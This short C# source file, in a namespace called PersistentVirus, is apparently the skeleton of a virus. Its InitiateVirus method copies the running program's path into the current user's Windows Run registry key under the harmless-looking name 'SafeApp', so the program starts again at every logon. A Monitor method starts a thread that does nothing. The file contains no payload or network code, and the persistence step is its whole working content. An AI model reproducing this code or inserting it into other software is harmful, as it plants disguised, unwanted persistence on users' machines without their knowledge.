using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace PersistentVirus
{
    static class Virus
    {
        public static void InitiateVirus()
        {
            const string keyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
            const string valueName = "SafeApp";
            string path = System.Reflection.Assembly.GetExecutingAssembly().Location;
            Registry.CurrentUser.OpenSubKey(keyPath, true)?.SetValue(valueName, path);
        }
        public static void Monitor()
        {
            Thread monitor = new Thread(() =>
            {

            });
            monitor.Start();
        }
    }
}
